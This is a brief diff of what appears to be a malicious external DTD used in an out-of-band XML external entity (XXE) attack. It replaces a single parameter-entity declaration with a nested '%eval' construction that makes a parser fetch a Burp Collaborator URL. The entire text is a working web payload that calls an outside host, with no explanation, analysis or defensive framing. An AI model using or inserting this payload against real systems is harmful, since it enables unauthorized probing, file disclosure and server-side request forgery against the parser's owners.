@@ -1,2 +1,3 @@
-<!ENTITY % error SYSTEM 'https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/'>
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/'>">
+%eval;
 %error;
